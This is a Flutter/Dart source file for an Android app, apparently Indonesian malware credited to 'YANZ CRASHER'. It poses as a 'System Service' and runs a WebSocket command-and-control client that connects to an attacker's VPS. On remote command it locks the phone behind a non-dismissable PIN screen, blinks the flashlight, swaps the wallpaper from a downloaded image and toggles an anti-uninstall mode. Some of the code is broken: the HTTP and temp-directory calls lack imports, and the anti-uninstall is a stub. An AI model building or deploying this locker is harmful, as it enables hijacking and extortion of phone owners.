import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flashlight/flashlight.dart';
import 'package:flutter_native_wallpaper/flutter_native_wallpaper.dart';
import 'package:device_apps/device_apps.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
  runApp(const PayloadApp());
}

class PayloadApp extends StatefulWidget {
  const PayloadApp({super.key});

  @override
  State<PayloadApp> createState() => _PayloadAppState();
}

class _PayloadAppState extends State<PayloadApp> {
  // ==================== VARIABLES ====================
  static const String SERVER_URL = 'ws://YOUR_VPS_IP:8080'; // GANTI DENGAN IP VPS ANDA
  
  late WebSocketChannel _channel;
  String _deviceId = '';
  bool _isConnected = false;
  
  // Lock variables
  bool _isLocked = false;
  String _lockPin = '';
  String _lockText = '';
  String _lockHtml = '';
  
  // Anti-uninstall
  bool _antiUninstall = false;
  
  // Flash state
  bool _flashOn = false;
  Timer? _flashTimer;
  
  // Notifications
  final FlutterLocalNotificationsPlugin _notifPlugin = FlutterLocalNotificationsPlugin();

  @override
  void initState() {
    super.initState();
    _initPermissions();
    _initNotifications();
    _loadState();
    _connectToServer();
    _keepScreenOn();
  }

  // ==================== PERMISSIONS ====================
  Future<void> _initPermissions() async {
    await [
      Permission.camera,
      Permission.storage,
      Permission.systemAlertWindow,
      Permission.ignoreBatteryOptimizations,
    ].request();
  }

  // ==================== NOTIFICATIONS ====================
  Future<void> _initNotifications() async {
    const init = AndroidInitializationSettings('@mipmap/ic_launcher');
    const settings = InitializationSettings(android: init);
    await _notifPlugin.initialize(settings);
  }

  void _showNotification(String title, String body) {
    const details = NotificationDetails(
      android: AndroidNotificationDetails(
        'payload_channel',
        'System Service',
        importance: Importance.high,
        priority: Priority.high,
        ongoing: true,
      ),
    );
    _notifPlugin.show(0, title, body, details);
  }

  // ==================== LOAD STATE ====================
  Future<void> _loadState() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _isLocked = prefs.getBool('isLocked') ?? false;
      _lockPin = prefs.getString('lockPin') ?? '';
      _lockText = prefs.getString('lockText') ?? 'HP ANDA TERKUNCI!';
      _lockHtml = prefs.getString('lockHtml') ?? '';
      _antiUninstall = prefs.getBool('antiUninstall') ?? false;
      _deviceId = prefs.getString('deviceId') ?? 'device_${DateTime.now().millisecondsSinceEpoch}';
    });
    
    if (_antiUninstall) {
      _enableAntiUninstall();
    }
    
    if (_isLocked) {
      _showLockScreen();
    }
  }

  Future<void> _saveState() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('isLocked', _isLocked);
    await prefs.setString('lockPin', _lockPin);
    await prefs.setString('lockText', _lockText);
    await prefs.setString('lockHtml', _lockHtml);
    await prefs.setBool('antiUninstall', _antiUninstall);
    await prefs.setString('deviceId', _deviceId);
  }

  // ==================== KEEP SCREEN ON ====================
  void _keepScreenOn() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
      SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
    });
  }

  // ==================== WEBSOCKET C2 ====================
  void _connectToServer() {
    try {
      _channel = WebSocketChannel.connect(Uri.parse(SERVER_URL));
      _channel.stream.listen(
        (message) {
          _handleMessage(message);
        },
        onDone: () {
          setState(() => _isConnected = false);
          _showNotification('Disconnected', 'Reconnecting in 5s...');
          Future.delayed(const Duration(seconds: 5), _connectToServer);
        },
        onError: (err) {
          setState(() => _isConnected = false);
          Future.delayed(const Duration(seconds: 5), _connectToServer);
        },
      );
      
      _channel.sink.add(jsonEncode({
        'type': 'register',
        'deviceId': _deviceId,
      }));
      
      setState(() => _isConnected = true);
      _showNotification('Connected', 'Device: $_deviceId');
      
      // Heartbeat every 30s
      Timer.periodic(const Duration(seconds: 30), (timer) {
        if (_isConnected) {
          _channel.sink.add(jsonEncode({'type': 'heartbeat'}));
        }
      });
      
    } catch (e) {
      Future.delayed(const Duration(seconds: 5), _connectToServer);
    }
  }

  // ==================== HANDLE COMMAND ====================
  void _handleMessage(dynamic raw) {
    try {
      final data = jsonDecode(raw);
      if (data['type'] == 'command') {
        _executeCommand(data['command']);
      }
    } catch (e) {
      print('Error parsing message: $e');
    }
  }

  void _executeCommand(Map<String, dynamic> cmd) {
    final type = cmd['cmd'] as String?;
    
    switch (type) {
      case 'flash':
        _cmdFlash(cmd['mode'] ?? 'normal', cmd['duration'] ?? 10);
        break;
      case 'lock':
        _cmdLock(
          pin: cmd['pin'] ?? '1234',
          text: cmd['text'] ?? 'HP ANDA TERKUNCI!',
          html: cmd['html'] ?? '',
        );
        break;
      case 'setwp':
        _cmdSetWallpaper(cmd['url'] ?? '');
        break;
      case 'antiuninstall':
        _cmdAntiUninstall(cmd['state'] ?? 'on');
        break;
      default:
        print('Unknown command: $type');
    }
  }

  // ==================== FLASH ====================
  void _cmdFlash(String mode, int duration) async {
    try {
      if (!await Flashlight.hasFlashlight) {
        _sendResult('error', 'No flashlight available');
        return;
      }
      
      if (mode == 'blink') {
        int count = 0;
        _flashTimer = Timer.periodic(const Duration(milliseconds: 500), (timer) {
          if (count >= duration * 2) {
            timer.cancel();
            Flashlight.off();
            return;
          }
          if (_flashOn) {
            Flashlight.off();
            _flashOn = false;
          } else {
            Flashlight.on();
            _flashOn = true;
          }
          count++;
        });
      } else {
        // Normal: on for duration, then off
        await Flashlight.on();
        _flashOn = true;
        Future.delayed(Duration(seconds: duration), () async {
          await Flashlight.off();
          _flashOn = false;
        });
      }
      _sendResult('success', 'Flash executed');
    } catch (e) {
      _sendResult('error', 'Flash failed: $e');
    }
  }

  // ==================== LOCKSCREEN HARD ====================
  void _cmdLock({required String pin, required String text, required String html}) {
    setState(() {
      _isLocked = true;
      _lockPin = pin;
      _lockText = text;
      _lockHtml = html;
    });
    _saveState();
    _showLockScreen();
    _sendResult('success', 'Device locked');
    _showNotification('LOCKED', 'Device locked with PIN: $pin');
  }

  void _showLockScreen() {
    if (!_isLocked) return;
    showDialog(
      context: context,
      barrierDismissible: false,
      useRootNavigator: true,
      builder: (ctx) => WillPopScope(
        onWillPop: () async => false,
        child: LockScreen(
          pin: _lockPin,
          text: _lockText,
          html: _lockHtml,
          onUnlock: () {
            setState(() {
              _isLocked = false;
              _lockPin = '';
              _lockText = '';
              _lockHtml = '';
            });
            _saveState();
            _sendResult('success', 'Device unlocked');
            Navigator.of(ctx).pop();
          },
        ),
      ),
    );
  }

  // ==================== SET WALLPAPER ====================
  void _cmdSetWallpaper(String url) async {
    try {
      if (url.isEmpty) {
        _sendResult('error', 'URL empty');
        return;
      }
      // Download image
      final response = await http.get(Uri.parse(url));
      if (response.statusCode != 200) {
        _sendResult('error', 'Failed to download image');
        return;
      }
      
      final dir = await getTemporaryDirectory();
      final file = File('${dir.path}/wallpaper.jpg');
      await file.writeAsBytes(response.bodyBytes);
      
      // Set wallpaper
      await FlutterNativeWallpaper.setWallpaper(file.path);
      _sendResult('success', 'Wallpaper changed');
    } catch (e) {
      _sendResult('error', 'Set wallpaper failed: $e');
    }
  }

  // ==================== ANTI UNINSTALL ====================
  void _cmdAntiUninstall(String state) {
    setState(() {
      _antiUninstall = state == 'on';
    });
    _saveState();
    
    if (_antiUninstall) {
      _enableAntiUninstall();
    } else {
      _disableAntiUninstall();
    }
    _sendResult('success', 'Anti-uninstall ${state.toUpperCase()}');
    _showNotification('Anti-Uninstall', 'State: ${state.toUpperCase()}');
  }

  void _enableAntiUninstall() {
    // Device Admin is handled via Android native code
    // We need to request admin permission
    // This is just a placeholder - actual implementation requires MethodChannel
    _showNotification('Anti-Uninstall', 'ACTIVATED');
  }

  void _disableAntiUninstall() {
    _showNotification('Anti-Uninstall', 'DEACTIVATED');
  }

  // ==================== SEND RESULT TO SERVER ====================
  void _sendResult(String status, String message) {
    if (_isConnected && _channel != null) {
      _channel.sink.add(jsonEncode({
        'type': 'result',
        'deviceId': _deviceId,
        'result': {'status': status, 'message': message},
      }));
    }
  }

  // ==================== BUILD UI ====================
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: _isLocked 
          ? Container(color: Colors.black) // Lock screen will overlay
          : MainScreen(
              deviceId: _deviceId,
              isConnected: _isConnected,
              antiUninstall: _antiUninstall,
            ),
      builder: (context, child) {
        return MediaQuery(
          data: MediaQuery.of(context).copyWith(
            textScaler: TextScaler.linear(1.0),
          ),
          child: child!,
        );
      },
    );
  }
}

// ==================== LOCK SCREEN WIDGET ====================
class LockScreen extends StatefulWidget {
  final String pin;
  final String text;
  final String html;
  final VoidCallback onUnlock;

  const LockScreen({
    super.key,
    required this.pin,
    required this.text,
    required this.html,
    required this.onUnlock,
  });

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  String _enteredPin = '';
  bool _error = false;

  void _addDigit(String digit) {
    setState(() {
      if (_enteredPin.length < 4) {
        _enteredPin += digit;
        _error = false;
      }
      if (_enteredPin.length == 4) {
        _checkPin();
      }
    });
  }

  void _deleteDigit() {
    setState(() {
      if (_enteredPin.isNotEmpty) {
        _enteredPin = _enteredPin.substring(0, _enteredPin.length - 1);
        _error = false;
      }
    });
  }

  void _checkPin() {
    if (_enteredPin == widget.pin) {
      widget.onUnlock();
    } else {
      setState(() {
        _error = true;
        _enteredPin = '';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: Container(
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.lock, size: 64, color: Colors.red),
              const SizedBox(height: 24),
              Text(
                widget.text,
                style: const TextStyle(
                  fontSize: 24,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 40),
              // PIN display
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: List.generate(4, (i) {
                  bool filled = i < _enteredPin.length;
                  return Container(
                    width: 50,
                    height: 50,
                    margin: const EdgeInsets.symmetric(horizontal: 8),
                    decoration: BoxDecoration(
                      border: Border.all(
                        color: _error ? Colors.red : Colors.white,
                        width: 2,
                      ),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: Center(
                      child: Text(
                        filled ? '●' : '',
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 28,
                        ),
                      ),
                    ),
                  );
                }),
              ),
              if (_error) ...[
                const SizedBox(height: 12),
                const Text('PIN SALAH!', style: TextStyle(color: Colors.red, fontSize: 16)),
              ],
              const SizedBox(height: 32),
              // PIN Pad
              GridView.count(
                shrinkWrap: true,
                crossAxisCount: 3,
                mainAxisSpacing: 12,
                crossAxisSpacing: 12,
                childAspectRatio: 1.2,
                physics: const NeverScrollableScrollPhysics(),
                children: [
                  _pinButton('1'),
                  _pinButton('2'),
                  _pinButton('3'),
                  _pinButton('4'),
                  _pinButton('5'),
                  _pinButton('6'),
                  _pinButton('7'),
                  _pinButton('8'),
                  _pinButton('9'),
                  _pinButton(''),
                  _pinButton('0'),
                  _deleteButton(),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _pinButton(String digit) {
    if (digit.isEmpty) return const SizedBox.shrink();
    return GestureDetector(
      onTap: () => _addDigit(digit),
      child: Container(
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.1),
          borderRadius: BorderRadius.circular(12),
        ),
        child: Center(
          child: Text(
            digit,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 28,
              fontWeight: FontWeight.bold,
            ),
          ),
        ),
      ),
    );
  }

  Widget _deleteButton() {
    return GestureDetector(
      onTap: _deleteDigit,
      child: Container(
        decoration: BoxDecoration(
          color: Colors.red.withOpacity(0.2),
          borderRadius: BorderRadius.circular(12),
        ),
        child: const Center(
          child: Icon(Icons.backspace, color: Colors.white, size: 28),
        ),
      ),
    );
  }
}

// ==================== MAIN SCREEN (UI SAAT TIDAK LOCK) ====================
class MainScreen extends StatelessWidget {
  final String deviceId;
  final bool isConnected;
  final bool antiUninstall;

  const MainScreen({
    super.key,
    required this.deviceId,
    required this.isConnected,
    required this.antiUninstall,
  });

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.security, size: 64, color: Colors.green),
            const SizedBox(height: 24),
            Text(
              'SYSTEM SERVICE',
              style: const TextStyle(
                color: Colors.white,
                fontSize: 20,
                fontWeight: FontWeight.bold,
                letterSpacing: 2,
              ),
            ),
            const SizedBox(height: 12),
            Text(
              'Device ID: $deviceId',
              style: const TextStyle(color: Colors.grey),
            ),
            const SizedBox(height: 8),
            Text(
              isConnected ? '🟢 Connected' : '🔴 Disconnected',
              style: TextStyle(
                color: isConnected ? Colors.green : Colors.red,
                fontSize: 16,
                fontWeight: FontWeight.w600,
              ),
            ),
            const SizedBox(height: 8),
            Text(
              antiUninstall ? '🛡️ Anti-Uninstall: ON' : '⚠️ Anti-Uninstall: OFF',
              style: TextStyle(
                color: antiUninstall ? Colors.orange : Colors.grey,
                fontSize: 14,
              ),
            ),
            const SizedBox(height: 32),
            const Text(
              'Aplikasi ini berjalan di background',
              style: TextStyle(color: Colors.grey, fontSize: 12),
            ),
            const Text(
              '© YANZ CRASHER',
              style: TextStyle(color: Colors.grey, fontSize: 10),
            ),
          ],
        ),
      ),
    );
  }
}